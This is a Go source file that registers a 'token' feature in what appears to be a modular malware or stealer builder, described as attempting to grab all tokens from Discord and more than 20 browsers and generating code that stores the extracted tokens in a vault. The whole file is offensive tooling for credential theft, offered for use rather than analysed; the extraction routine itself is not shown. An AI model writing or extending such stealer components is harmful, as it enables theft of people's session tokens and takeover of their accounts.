package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "token",
		Description: "Attempt to grab all tokens from Discord and 20+ browsers",
		ReturnsData: true,
		Args:        []Arg{},
		Dependencies: []string{
			"system.lib.go",
		},
		GenerateCode: func(args FeatureSetArgsList) (string, error) {
			output := "vault.StoreTable(ToTable(ExtractTokens()))"

			return output, nil
		},
	})
}
